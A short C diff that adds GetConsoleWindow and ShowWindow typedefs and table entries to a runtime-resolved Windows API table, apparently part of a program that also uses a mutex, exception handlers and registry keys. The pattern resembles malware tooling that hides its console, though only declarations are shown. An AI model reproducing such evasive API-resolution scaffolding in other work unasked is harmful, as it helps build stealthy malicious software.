@@ -51,6 +51,8 @@ typedef PVOID (WINAPI *_AddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_
 typedef VOID (WINAPI *_ExitProcess)(UINT);
 typedef HANDLE (WINAPI *_CreateMutexW)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR);
 typedef HANDLE (WINAPI *_GetProcessHeap)(void);
+typedef HWND (WINAPI *_GetConsoleWindow)(void);
+typedef BOOL (WINAPI *_ShowWindow)(HWND, int);
 
 //Advapi32 TYPEDEFS
 typedef LSTATUS (WINAPI *_RegCreateKeyExW)(HKEY, LPCWSTR, DWORD, LPWSTR, DWORD, REGSAM, const LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
@@ -125,6 +127,8 @@ struct API_TABLE {
     _ExitProcess            ExitProcess;
     _CreateMutexW           CreateMutexW;
     _GetProcessHeap         GetProcessHeap;
+    _GetConsoleWindow       GetConsoleWindow;
+    _ShowWindow             ShowWindow;
 
     // Advapi32
     _RegCreateKeyExW        RegCreateKeyExW;
